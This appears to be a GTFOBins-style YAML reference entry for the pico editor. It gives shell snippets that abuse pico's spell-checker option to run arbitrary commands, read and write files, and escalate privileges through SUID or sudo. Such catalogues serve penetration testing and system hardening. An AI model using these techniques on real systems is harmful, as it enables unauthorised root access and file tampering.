---
functions:
  execute-non-interactive:
    - description: After running this exit the editor to see the command output.
      code: |
        COMMAND=id
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        pico -s $TF /etc/hosts
        ^T
  file-write:
    - code: |
        pico file_to_write
        DATA
        ^O
  file-read:
    - code: pico file_to_read
  suid-enabled:
    - description: After running this exit the editor to see the command output.
      code: |
        COMMAND=id
        TF=$(mktemp)
        echo $'#!/bin/sh -p\n'"$COMMAND" > $TF
        chmod +x $TF
        ./pico -s $TF /etc/hosts
        ^T
  sudo-enabled:
    - description: After running this exit the editor to see the command output.
      code: |
        COMMAND=id
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo pico -s $TF /etc/hosts
        ^T
---
